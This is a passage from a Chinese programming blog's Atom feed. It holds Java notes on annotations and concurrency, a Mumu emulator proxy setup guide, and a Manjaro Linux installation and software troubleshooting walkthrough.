5.Transient</h3><p>  被transient修饰的变量在被序列化时不会被处理，可以防止敏感部分被序列化。</p><h1 id="第二十章-注解"><a class="markdownIt-Anchor" href="#第二十章-注解"></a> 第二十章  注解</h1><h2 id="一-定义注解"><a class="markdownIt-Anchor" href="#一-定义注解"></a> 一、定义注解</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义注解用在什么地方</span></span><br><span class="line"><span class="meta">@Target(ElementType.CONSTRUCTOR)</span>     <span class="comment">//构造器</span></span><br><span class="line">        ElementType.FIELD            <span class="comment">//域</span></span><br><span class="line">        ElementType.LOCAL_VARIABLE   <span class="comment">//局部变量</span></span><br><span class="line">        ElementType.METHOD           <span class="comment">//方法</span></span><br><span class="line">        ElementType.PACKAGE          <span class="comment">//包</span></span><br><span class="line">        ElementType.PARAMETER        <span class="comment">//参数</span></span><br><span class="line">        ElementType.TYPE             <span class="comment">//类，接口</span></span><br><span class="line"><span class="comment">//定义在什么级别保存注解</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.SOURCE)</span>   <span class="comment">//源码级别，被编译器丢弃</span></span><br><span class="line">           RetentionPolicy.CLASS     <span class="comment">//class文件级别，被VM丢弃</span></span><br><span class="line">           RetentionPolicy.RUNTIME   <span class="comment">//运行时级别，可通过反射读取</span></span><br><span class="line"><span class="comment">//注解会被包含在JavaDoc中</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="comment">//子类可继承父类注解</span></span><br><span class="line"><span class="meta">@Inherited</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Test() &#123;&#125;;</span><br></pre></td></tr></table></figure><h2 id="二-实现注解处理器"><a class="markdownIt-Anchor" href="#二-实现注解处理器"></a> 二、实现注解处理器</h2><p>  通过<code>method.getAnnotation(ClassName.class)</code>来判断方法上是否有指定类型的注解，并进行后续处理。</p><h1 id="第二十一章-并发"><a class="markdownIt-Anchor" href="#第二十一章-并发"></a> 第二十一章  并发</h1><h2 id="一-任务定义与执行"><a class="markdownIt-Anchor" href="#一-任务定义与执行"></a> 一、任务定义与执行</h2><h3 id="1定义任务"><a class="markdownIt-Anchor" href="#1定义任务"></a> 1.定义任务</h3><p>  实现Runable接口并编写run()方法，并在run中实现所需业务操作。</p><h3 id="2thread类"><a class="markdownIt-Anchor" href="#2thread类"></a> 2.Thread类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread t=<span class="keyword">new</span> Thread(<span class="keyword">new</span> ClassA());</span><br><span class="line">t.start();</span><br></pre></td></tr></table></figure><p>  为Thread构造器传入一个Runable对象，再调用Thread的<code>start()</code>方法，此时会创建一个新线程。</p><h3 id="3executor"><a class="markdownIt-Anchor" href="#3executor"></a> 3.Executor</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ExecutorService exec=Executors.newCachedThreadPool();</span><br><span class="line">exec.execute(<span class="keyword">new</span> ClassA());</span><br><span class="line">exec.shutdown();</span><br></pre></td></tr></table></figure><p>  通过<code>exec.execute</code>提交任务，<code>exec.shutdown</code>可以防止新任务被提交，但是已提交的任务会继续执行，将在所有任务完成后退出。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Executors在线程有可能的情况下都会被复用</span></span><br><span class="line">Executors.newCachedThreadPool()</span><br><span class="line">Executors.newFixedThreadPool(Count)  <span class="comment">//数量有限的线程池，一次完成所有线程创建</span></span><br><span class="line">Executors.newSingleThreadPool()      <span class="comment">//只有1个线程，若提交多个任务会排队执行</span></span><br></pre></td></tr></table></figure><h2 id="二-任务回调"><a class="markdownIt-Anchor" href="#二-任务回调"></a> 二、任务回调</h2><h3 id="1可回调的任务"><a class="markdownIt-Anchor" href="#1可回调的任务"></a> 1.可回调的任务</h3><p>  Runable只可执行，不能回调。<br />  需要实现Callable接口，类型参数为call()方法的返回值。</p><h3 id="2任务调用"><a class="markdownIt-Anchor" href="#2任务调用"></a> 2.任务调用</h3><p>  须用<code>exec.submit(new ClassA())</code>来调用，submit方法会返回Future对象，Future是泛型的，其参数类型是回调函数返回值的类型。<br />  可以用isDone()方法来查询Future是否完成，任务完成时，会产生结果，可用get()方法进行获取，如果在未完成时即调用get()方法，则会一致阻塞到有结果产生。</p><h2 id="三-任务控制"><a class="markdownIt-Anchor" href="#三-任务控制"></a> 三、任务控制</h2><h3 id="1休眠"><a class="markdownIt-Anchor" href="#1休眠"></a> 1.休眠</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread.sleep()                  (老方式)  </span><br><span class="line">TimeUnit.MILLISECONDS.sleep()   (Java SE5/<span class="number">6</span>)</span><br></pre></td></tr></table></figure><h3 id="2优先级"><a class="markdownIt-Anchor" href="#2优先级"></a> 2.优先级</h3><p>  在任务内部，调用<code>Thread.currentThread().getPriority()</code>来获取优先级。调用<code>Thread.currentThread().setPriority()</code>来修改优先级。</p><p>  建议的优先级：</p><ol><li>MAX_PRIORITY</li><li>NORMAL_PRIORITY</li><li>MIN_PRIORITY</li></ol><h3 id="3让步"><a class="markdownIt-Anchor" href="#3让步"></a> 3.让步</h3><p>  使用yield方法可以暗示建议其他具有相同优先级的线程先运行，但是不保证效果。</p><h3 id="4后台线程"><a class="markdownIt-Anchor" href="#4后台线程"></a> 4.后台线程</h3><p>  在<code>Thread.start()</code>之前先<code>Thread.setDaemo(true)</code>将线程设置为后台线程，在程序的非后台线程结束时，程序会中指运行，并杀死所有的后台线程。</p><h3 id="5异常处理"><a class="markdownIt-Anchor" href="#5异常处理"></a> 5.异常处理</h3><p>  无法直接用try-catch从线程中捕获异常，但是可以在每一个Thread对象上附着一个异常处理器。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread t=<span class="keyword">new</span> Thread();</span><br><span class="line">t.setUncaughtExceptionHandler(<span class="keyword">new</span> MyUncaughtExceptionHandler())</span><br><span class="line"></span><br><span class="line"><span class="comment">//MyUncaughtExceptionHandler实现接口与方法</span></span><br><span class="line">Class MyUncaughtExceptionHandler implements Thread.UncaughtExceptionHandler&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">uncaughtException</span><span class="params">(Thread t,Throwable e)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="四-资源共享"><a class="markdownIt-Anchor" href="#四-资源共享"></a> 四、资源共享</h2><h3 id="1加锁"><a class="markdownIt-Anchor" href="#1加锁"></a> 1.加锁</h3><p>  用<code>synchronized</code>修饰的方法或代码片段，会在执行时检查-&gt;获取锁-&gt;执行-&gt;释放锁。<br />  一个对象中的所有同步方法共享一个锁，若某个任务调用了其中一个加锁方法，则只有等其结束并释放后，其他任务才能调用其中的任何一个同步方法。</p><h3 id="2原子性"><a class="markdownIt-Anchor" href="#2原子性"></a> 2.原子性</h3><p>  Java中，所有出了long和double以外的基本类型进行读写都是原子性的，但JVM对于64位的long和double会拆分成两个32位的操作，破坏原子性。<br />  可以用volatile修饰long和double来获取原子性简单操作，此外，Java还提供AtomicLong，AtomicInteger，AtomicReference等原子类。</p><h3 id="3临界区"><a class="markdownIt-Anchor" href="#3临界区"></a> 3.临界区</h3><p>  可用<code>synchronized(ObjectA)&#123; 代码块 &#125;</code>来对ObjectA的某个代码块加同步锁，在进入该代码块之前必须获得该对象的锁。</p><h3 id="4线程本地存储"><a class="markdownIt-Anchor" href="#4线程本地存储"></a> 4.线程本地存储</h3><p>  使用<code>ThreadLocal</code>创建本地存储的副本，用<code>get()</code>可以获得与该线程关联的副本，用<code>set()</code>可以将参数写入线程的存储对象中。</p><h2 id="五-线程中止"><a class="markdownIt-Anchor" href="#五-线程中止"></a> 五、线程中止</h2><h3 id="1线程的状态"><a class="markdownIt-Anchor" href="#1线程的状态"></a> 1.线程的状态</h3><ol><li>新建(new)<br />  创建进程时会短暂处于该状态，此时已分配了必须的系统资源，并执行了初始化，之后会变为可运行/阻塞状态。</li><li>就绪(Runable)<br />  此时只要调度器把时间片分配给线程，线程就可以运行，运行不运行完全取决于是否获得CPU时间。</li><li>阻塞(Blocked)<br />  线程虽能运行，但有条件阻止其运行。调度器不会分配时间，直至线程重新回到就绪状态。</li><li>死亡(Dead)<br />  不可调度，也不会获得时间，通常从run()中返回，但可被中断。</li></ol><h3 id="2进入阻塞"><a class="markdownIt-Anchor" href="#2进入阻塞"></a> 2.进入阻塞</h3><ol><li>调用<code>sleep()</code></li><li>调用<code>wait()</code>，直到线程得到<code>notify()/notifyAll()/signal()/signalAll()</code>才会进入就绪状态</li><li>等待某个输入/输出完成</li><li>任务试图在对象上调用其同步方法，但是无法获取对象锁</li></ol><h3 id="3中断"><a class="markdownIt-Anchor" href="#3中断"></a> 3.中断</h3><p>  Thread类包含<code>interrupt()</code>方法，可以打断被阻塞的方法。</p><h2 id="六-线程协作"><a class="markdownIt-Anchor" href="#六-线程协作"></a> 六、线程协作</h2><h3 id="1wait与notify"><a class="markdownIt-Anchor" href="#1wait与notify"></a> 1.wait与notify</h3><p>  sleep与yield并不会释放锁，只有wait才会使线程挂起，并释放锁，其他synchronized方法才能继续调用。</p><p>  wait有两种形式:</p><ol><li>带毫秒参数，在时间到期后会恢复执行</li><li>不带参，将会无限等待</li></ol><p>  该方法是基类Object的一部分，而不属于Thread，所以可放在任何同步方法中。</p><p>  notify()会唤醒一个任务，notifyAll()会唤醒在等待某个特定锁的任务。</p><h3 id="2await与signal"><a class="markdownIt-Anchor" href="#2await与signal"></a> 2.await与signal</h3><p>  <code>Condition.await()</code>挂起任务，调用signal或signalAll可以唤醒Condition上被其自身挂起的任务。</p><h3 id="3同步队列"><a class="markdownIt-Anchor" href="#3同步队列"></a> 3.同步队列</h3><p>  向同步队列中插入或移除元素，如果队列为空但试图从队列中获取对象，就会被挂起，直到队列中有对象可用。</p><p>  LinkedBlockingQueue是无届队列。<br />  ArrayBlockingQueue有固定尺寸。</p><p>  高级封装：管道(PipedWriter/PipedReader)。</p><p>  写入类实现一个PipedWriter对象，然后<code>writer.write()</code>。<br />  读取类要先获取写入类的writer，并以此为参数构建Reader，再调用<code>reader.read()</code>。</p><h2 id="七-死锁"><a class="markdownIt-Anchor" href="#七-死锁"></a> 七、死锁</h2><h3 id="1死锁条件需同时满足"><a class="markdownIt-Anchor" href="#1死锁条件需同时满足"></a> 1.死锁条件(需同时满足)</h3><ol><li>任务互斥，两个任务请求同一个不能共享的资源</li><li>一个任务已持有一个资源，并在等待一个被其他任务占有的资源</li><li>资源不能被抢占，必须等待释放</li><li>存在循环等待</li></ol><h2 id="八-类库"><a class="markdownIt-Anchor" href="#八-类库"></a> 八、类库</h2><h3 id="1countdownlatch"><a class="markdownIt-Anchor" href="#1countdownlatch"></a> 1.CountDownLatch</h3><p>  构造时指定一个计数值，该值通过调用<code>countDown()</code>来递减1，在调用await()后对象会被阻塞，当计数器到0之后会恢复运行。</p><h3 id="2cyclicbarrier"><a class="markdownIt-Anchor" href="#2cyclicbarrier"></a> 2.CyclicBarrier</h3><p>  与CountDownLatch类似，但是CountDownLatch是一个线程在等待多个线程，而CyclicBarrier是多个线程await之后都在等待计数器，到0之后会一起恢复运行。</p><h3 id="3delayqueue"><a class="markdownIt-Anchor" href="#3delayqueue"></a> 3.DelayQueue</h3><p>  一个无界的BlockingQueue，内部放置的是实现了Delayed接口的对象，对象有一个到期时间，在到期之后才可以被取走。<br />  该队列是有序的，队首元素是到期时间最长的元素，如果没有对象到期，试图poll会返回null。</p><h3 id="4priorityblockingqueue"><a class="markdownIt-Anchor" href="#4priorityblockingqueue"></a> 4.PriorityBlockingQueue</h3><p>  线程安全的优先级队列，总是先执行优先级最高的任务。</p><h3 id="5semaphore"><a class="markdownIt-Anchor" href="#5semaphore"></a> 5.Semaphore</h3><p>  技术信号量(有点类似池的概念)，管理有限的对象。</p><h3 id="6exchanger"><a class="markdownIt-Anchor" href="#6exchanger"></a> 6.Exchanger</h3><p>  双向同步队列，其中一个线程被调用时会唤醒另一个调用此方法的线程，两者交换数据。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第一章-对象导论&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#第一章-对象导论&quot;&gt;&lt;/a&gt; 第一章  对象导论&lt;/h1&gt;
&lt;h3 id=&quot;1面向对象语言的五个特性&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=</summary>
      
    
    
    
    <category term="Java" scheme="https://coder.lufer.cc/categories/Java/"/>
    
    
    <category term="Java" scheme="https://coder.lufer.cc/tags/Java/"/>
    
    <category term="后端" scheme="https://coder.lufer.cc/tags/%E5%90%8E%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>网易Mumu代理设置</title>
    <link href="https://coder.lufer.cc/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/%E7%BD%91%E6%98%93Mumu%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE/"/>
    <id>https://coder.lufer.cc/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/%E7%BD%91%E6%98%93Mumu%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE/</id>
    <published>2019-07-21T01:35:56.000Z</published>
    <updated>2021-12-17T03:59:35.253Z</updated>
    
    <content type="html"><![CDATA[<p>  最近要用Mumu模拟器，但是有设置代理的需要。</p><p>  一开始下载了某NG应用，但是无法启动服务。</p><p>  既然模拟器是电脑的一部分，那么为何不走电脑的代理上网呢。</p><p>  先说一下其中比较坑的两个点：</p><h3 id="代理ip"><a class="markdownIt-Anchor" href="#代理ip"></a> 代理IP</h3><p>  代理IP要填写电脑拿到的内网IP，而不是平时设置的127.0.0.1。</p><h3 id="要设置例外规则"><a class="markdownIt-Anchor" href="#要设置例外规则"></a> 要设置例外规则</h3><p>  一开始设置好代理后，发现Mumu模拟器无法正常切换标签，随后又无法正常使用键盘，重启后卡99%，百度后在这篇文章中发现问题：</p><p>  <a href="https://www.jianshu.com/p/9f08e43b95fc">网易MUMU模拟器在macOS系统下，启动卡99%与键盘无法使用问题解决</a></p><p>  文章中提到，抓包后会发现Mumu模拟器向10.0.2.2发送了网络请求，但由于进行了代理，无法正常与本机进行交互。</p><p>  文章中提到了使用DNS Spoofing进行地址转发，但这似乎有点大材小用。</p><h2 id="代理设置"><a class="markdownIt-Anchor" href="#代理设置"></a> 代理设置</h2><ol><li>本地代理软件允许来自局域网的连接，启用本地HTTP监听</li><li>Mumu模拟器设置-WLAN-修改网络-代理(手动)</li><li>填写本机IP，HTTP监听端口，在例外规则中填写10.0.2.2</li><li>保存退出，正常工作</li></ol><p><img src="https://pic.lufer.cc/images/2021/03/15/e5SJu6.png" alt="" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  最近要用Mumu模拟器，但是有设置代理的需要。&lt;/p&gt;
&lt;p&gt;  一开始下载了某NG应用，但是无法启动服务。&lt;/p&gt;
&lt;p&gt;  既然模拟器是电脑的一部分，那么为何不走电脑的代理上网呢。&lt;/p&gt;
&lt;p&gt;  先说一下其中比较坑的两个点：&lt;/p&gt;
&lt;h3 id=&quot;代理ip&quot;&gt;</summary>
      
    
    
    
    <category term="日常折腾" scheme="https://coder.lufer.cc/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"/>
    
    
    <category term="日常折腾" scheme="https://coder.lufer.cc/tags/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"/>
    
    <category term="Mumu" scheme="https://coder.lufer.cc/tags/Mumu/"/>
    
  </entry>
  
  <entry>
    <title>Manjaro安装/配置/常用软件安装与BUG解决</title>
    <link href="https://coder.lufer.cc/Linux/Manjaro%E5%AE%89%E8%A3%85-%E9%85%8D%E7%BD%AE-%E5%B8%B8%E7%94%A8%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8EBUG%E8%A7%A3%E5%86%B3/"/>
    <id>https://coder.lufer.cc/Linux/Manjaro%E5%AE%89%E8%A3%85-%E9%85%8D%E7%BD%AE-%E5%B8%B8%E7%94%A8%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8EBUG%E8%A7%A3%E5%86%B3/</id>
    <published>2019-06-25T15:20:36.000Z</published>
    <updated>2021-12-17T03:59:35.253Z</updated>
    
    <content type="html"><![CDATA[<p>  Manjaro，基于ArchLinux的Linux发行版，中文社区见<code>https://www.manjaro.cn/</code>。</p><h1 id="安装"><a class="markdownIt-Anchor" href="#安装"></a> 安装</h1><p>  Manjaro官方提供了三种版本——XFCE，KDE，GNOME，其实这些版本也就是桌面不同而已，我使用的是KDE版本。官方下载地址（<a href="https://manjaro.org/get-manjaro/%EF%BC%89%E3%80%82">https://manjaro.org/get-manjaro/）。</a></p><p>  随意下载一款官方ISO即可，随后刻录到U盘。</p><p>  这里刻录时官方推荐使用Rufus的DD模式，我也使用了这款软件，并不知用其他方式会怎样，建议按照官方要求来。</p><p>  下载<a href="https://rufus.ie/">Rufus</a>，并选择ISO，U盘，点击开始会提示是否使用DD模式，选DD。</p><p>  刻录完成后重启，选BootDevice，引导成功则进入初始界面，选择时区，语言等，选择Boot。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4zw60.png" alt="" /></p><p>  启动后会有一个体验版本的Manjaro，让你在未安装时即可使用Manjaro，体验一番。</p><p>  点击Install，开始安装。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4ztYj.png" alt="" /></p><p>  设置键盘。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4zYkQ.png" alt="" /></p><p>  设置分区，这里要注意，如果是从Windows空闲磁盘中划出空间安装，则分区不能超过4个，否则将会无法继续安装。如果少于4个，选择替换分区安装。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4zdlq.png" alt="" /></p><p>  如果不要之前的系统，需要抹除磁盘，直接替换C盘是无法识别原有文件的。</p><p>  随后设置用户名密码，就可以安装了。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4zNfs.png" alt="" /></p><p>  最好断网安装，不然可能会卡在90%+的地方！！！</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4zapn.png" alt="" /></p><h1 id="初始化配置"><a class="markdownIt-Anchor" href="#初始化配置"></a> 初始化配置</h1><p>  安装成功之后进入系统，首先要进行一波初始化的设置。</p><h2 id="更换pacman的软件源"><a class="markdownIt-Anchor" href="#更换pacman的软件源"></a> 更换Pacman的软件源</h2><blockquote><p>sudo pacman-mirrors -i -c China -m rank</p></blockquote><p>  会自动检测软件源的延迟，并弹出对话框进行选择。我一开始选了清华的源，但是好像有些问题，建议选华为或者科大的源。</p><h2 id="添加archlinuxcn的软件源"><a class="markdownIt-Anchor" href="#添加archlinuxcn的软件源"></a> 添加Archlinuxcn的软件源</h2><p>  修改/etc/pacman.conf,在最后一行添加：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[archlinuxcn]</span><br><span class="line">SigLevel &#x3D; Optional TrustedOnly</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;archlinuxcn&#x2F;$arch</span><br></pre></td></tr></table></figure><p>  两个源都换好之后，直接更新一波应用及系统。</p><blockquote><p>sudo pacman -Syyu</p></blockquote><p>  会各种刷屏，提示是否替换一般直接同意，问题不大。</p><h2 id="安装yay"><a class="markdownIt-Anchor" href="#安装yay"></a> 安装yay</h2><p>  pacman好像并不能获取Archlinux的源，或者软件不全？反正很多软件我用pacman是找不到的，用yay则可以安装。</p><blockquote><p>sudo pacman -S yay base-devel</p></blockquote><h1 id="常用软件安装与bug解决"><a class="markdownIt-Anchor" href="#常用软件安装与bug解决"></a> 常用软件安装与BUG解决</h1><p>  列表:<br /><a href="#%E8%BE%93%E5%85%A5%E6%B3%95">输入法</a>|<a href="#Tim&amp;&amp;WeChat">Tim&amp;&amp;WeChat</a>|<a href="#WPS">WPS</a>|<a href="#V2ray">V2ray</a>|<a href="#TeamViewer">TeamViewer</a></p><h2 id="输入法"><a class="markdownIt-Anchor" href="#输入法"></a> 输入法</h2><h3 id="安装-2"><a class="markdownIt-Anchor" href="#安装-2"></a> 安装</h3><p>  最重要的是先装输入法，安装搜狗输入法为例。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S fcitx-sogoupinyin</span><br><span class="line">sudo pacman -S fcitx-im </span><br><span class="line">sudo pacman -S fcitx-configtool</span><br></pre></td></tr></table></figure><p>  如果想安装谷歌输入法，则把第一句改成。</p><blockquote><p>sudo pacman -S fcitx-googlepinyin</p></blockquote><p>  安装完包之后，还需要修改一下配置。</p><p>  打开~/.profile，写入以下几行。如果没有这个文件则创建。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export GTK_IM_MODULE&#x3D;fcitx</span><br><span class="line">export QT_IM_MODULE&#x3D;fcitx</span><br><span class="line">export XMODIFIERS&#x3D;&quot;@im&#x3D;fcitx&quot;</span><br></pre></td></tr></table></figure><p>  重启即可使用输入法，如果重启之后没有，手动运行一下fcitx，开始菜单里面直接搜索即可。</p><h3 id="换肤"><a class="markdownIt-Anchor" href="#换肤"></a> 换肤</h3><p>  去网站上下载皮肤，例如: <a href="https://www.deepin.org/2011/12/17/fcitx-skins/%E3%80%82">https://www.deepin.org/2011/12/17/fcitx-skins/。</a></p><p>  直接下载压缩包，解压，把文件夹复制走，直接移动好像是不行的，需要提权。</p><p>  以皮肤LX-Simple7(Black)为例。</p><blockquote><p>sudo cp -r /home/lufer/下载/LX-Simple7(Black)  /usr/share/fcitx/skin/</p></blockquote><p>  然后就可以在输入法配置中选择皮肤了。</p><h2 id="timwechat"><a class="markdownIt-Anchor" href="#timwechat"></a> Tim&amp;&amp;Wechat</h2><p>  Tim可以直接在Octopi中进行搜索，包名为 deepin.com.qq.office,直接安装。<br />  Wechat则可以在Octopi中搜索electronic-wechat。</p><p>  此时Tim可能会打不开，如果打不开则需要进行如下设置：</p><ol><li><p>安装gnome-settings-daemon，在Octopi中搜索安装即可，安装所有依赖</p></li><li><p>在桌面设置中，将/usr/lib/gsd-xsettings设置为自动启动</p></li></ol><p>  此时Tim或Wechat可能会无法输入中文，建议先进行尝试，如果真的无法输入中文再进行修改。</p><p>  修改方法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修改两个文件：</span><br><span class="line">&#x2F;opt&#x2F;deepinwine&#x2F;apps&#x2F;Deepin-TIM&#x2F;run.sh</span><br><span class="line">&#x2F;opt&#x2F;deepinwine&#x2F;apps&#x2F;Deepin-WeChat&#x2F;run.sh        </span><br><span class="line"></span><br><span class="line">在两个文件最前面加入 一下三句话：                        </span><br><span class="line">export XMODIFIERS&#x3D;&quot;@im&#x3D;fcitx&quot;                        </span><br><span class="line">export GTK_IM_MODULE&#x3D;&quot;fcitx&quot;                        </span><br><span class="line">export QT_IM_MODULE&#x3D;&quot;fcitx&quot;</span><br></pre></td></tr></table></figure><p>  此时Tim必定存在字体发虚的情况，这个问题好像比较复杂，我也没有找到太好的解决方案。</p><p>  先是看了如下一句话：</p><p>  <code>Manjaro/ArchLinux下QQ和TIM字体发虚：需要安装打了字体清晰化补丁(如infinality/ultimate5)的freetype的lib32位包，挺复杂，建议不折腾。(https://www.lulinux.com/archives/1319)。</code></p><p>  故考虑安装lib32-infinality-freetype2的包，装完之后发现并不好使，此路不通。</p><p>  方法二：</p><p>  <code>故在调整dpi时需要使用环境变量调用deepin的wine(https://www.cnblogs.com/mrway/p/10858234.html)。</code></p><p>  但是此命令找不到winecfg文件，我在各个deepin里面找了都没找到，这玩意也不行。</p><blockquote><p>env WINEPREFIX=&quot;$HOME/.deepinwine/Deepin-TIM&quot; winecfg</p></blockquote><p>  这时我看到了这样一篇文章：</p><p>  <code>Linux操作系统下Wine中文显示不正常的解决方案(https://blog.csdn.net/coderjiang/article/details/30737383)。</code></p><p>  虽然他是Ubuntu系统，但是他修改注册表的方法启发了我。</p><p>  打开Tim路径下的注册表，应该是在如下路径，记得替换成自己的用户名</p><blockquote><p>/home/lufer/.deepinwine/Deepin-TIM/system.reg</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修改</span><br><span class="line">[System\\CurrentControlSet\\Hardware Profiles\\Current\\Software\\Fonts]</span><br><span class="line">将“LogPixels”&#x3D;dword:00000060”</span><br><span class="line">改为“LogPixels”&#x3D;dword:00000070”。</span><br><span class="line"></span><br><span class="line">这步操作可以改一下字体大小，随后改一下字体</span><br><span class="line"></span><br><span class="line">修改</span><br><span class="line">”[Software\\Microsoft\\Windows NT\\CurrentVersion\\FontSubstitutes] xxxx“项，将其中的”MS Shell Dlg“相关的两项修改成如下内容（即更换字体为宋体）：</span><br><span class="line"></span><br><span class="line">“MS Shell Dlg”&#x3D;”SimSun”</span><br><span class="line">“MS Shell Dlg 2″&#x3D;”SimSun”</span><br><span class="line"></span><br><span class="line">这里我尝试修改为其他字体，但是好像没有，还会被改回去，其默认就是宋体，所以还是用宋体吧</span><br><span class="line"></span><br><span class="line">但是这里的问题就是系统不带宋体，所以需要下载一个宋体的ttf文件，然后放到</span><br><span class="line"></span><br><span class="line">&#x2F;home&#x2F;lufer&#x2F;.deepinwine&#x2F;Deepin-TIM&#x2F;drive_c&#x2F;windows&#x2F;Fonts&#x2F;</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;fonts&#x2F;TTF&#x2F;</span><br></pre></td></tr></table></figure><p>  我不确定哪里有效，所以两边都放一下，这样之后文字会改为宋体，并放大一号，好歹能用了，就是丑一点。</p><h2 id="wps"><a class="markdownIt-Anchor" href="#wps"></a> WPS</h2><p>  由于没有Word，所以安装WPS，直接在Octopi中搜索WPS-office安装即可。</p><h3 id="无法输入汉字"><a class="markdownIt-Anchor" href="#无法输入汉字"></a> 无法输入汉字</h3><p>  修改/usr/bin下面的三个脚本，把fcitx的启动命令加进去。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;bin&#x2F;wps   对应WPS文字</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;et    对应WPS表格</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;wpp   对应WPS演示</span><br><span class="line"></span><br><span class="line">在这三个文件的开头添加</span><br><span class="line"></span><br><span class="line">export XMODIFIERS&#x3D;&quot;@im&#x3D;fcitx&quot;                        </span><br><span class="line">export GTK_IM_MODULE&#x3D;&quot;fcitx&quot;                        </span><br><span class="line">export QT_IM_MODULE&#x3D;&quot;fcitx&quot;</span><br></pre></td></tr></table></figure><h3 id="缺少字体"><a class="markdownIt-Anchor" href="#缺少字体"></a> 缺少字体</h3><p>  直接上网下载ttf格式的字体，缺什么下什么，然后用cp命令把这些字体都移动到/usr/share/fonts/TTF/。</p><p>  在使用下面这个命令刷新字体缓存。</p><blockquote><p>fc-cache -fv</p></blockquote><h2 id="v2ray"><a class="markdownIt-Anchor" href="#v2ray"></a> V2ray</h2><p>  直接在Octopi里面搜索V2ray安装，装完之后控制台输入v2ray启动。</p><p>  但是并不能直接启动！！这才是最坑爹的，自动安装会把v2ray的文件扔到/etc/但是他并不能识别。</p><p>  还需要进行如下步骤：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修改&#x2F;etc&#x2F;v2ray&#x2F;config.json为正确内容</span><br><span class="line"></span><br><span class="line">cp &#x2F;etc&#x2F;v2ray&#x2F;下面的geoip.dat和geosite.dat 到 &#x2F;usr&#x2F;bin</span><br><span class="line"></span><br><span class="line">最后还需要以指定config的方式启动</span><br><span class="line"></span><br><span class="line">sudo v2ray -config &#x2F;etc&#x2F;v2ray&#x2F;config.json </span><br></pre></td></tr></table></figure><p>这里补充一句，如果想让终端中的命令走代理</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">设置代理</span><br><span class="line">export http_proxy&#x3D;&quot;socks5:&#x2F;&#x2F;127.0.0.1:1080&quot;</span><br><span class="line">export https_proxy&#x3D;&quot;socks5:&#x2F;&#x2F;127.0.0.1:1080&quot;</span><br><span class="line">取消代理</span><br><span class="line">unset http_proxy</span><br><span class="line">unset https_proxy</span><br></pre></td></tr></table></figure><h2 id="teamviewer"><a class="markdownIt-Anchor" href="#teamviewer"></a> TeamViewer</h2><p>  Octopi搜索安装TeamViewer，但是装完会出现没有ID的情况。</p><p>  解决办法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修改DNS，改为114之类的，以防是网络问题</span><br><span class="line"></span><br><span class="line">执行命令（可能需要sudo）</span><br><span class="line">teamviewer -daemon start</span><br></pre></td></tr></table></figure><h2 id="chrome"><a class="markdownIt-Anchor" href="#chrome"></a> Chrome</h2><p>  Octopi安装Chrome，但是刚安装如果没有代理插件的话无法设置代理，这时需要以带参数的命令启动Chrome让他在代理环境下运行。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo google-chrome --proxy-server=“socks://127.0.0.1:port” --no-sandbox --user-data-dir</span><br></pre></td></tr></table></figure><p>  其余软件好像没啥坑了，印象不大。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  Manjaro，基于ArchLinux的Linux发行版，中文社区见&lt;code&gt;https://www.manjaro.cn/&lt;/code&gt;。&lt;/p&gt;
&lt;h1 id=&quot;安装&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#安装&quot;&gt;&lt;/a&gt; 安装</summary>
      
    
    
    
    <category term="Linux" scheme="https://coder.lufer.cc/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://coder.lufer.cc/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>今日头条前端实习生面试三面总结</title>
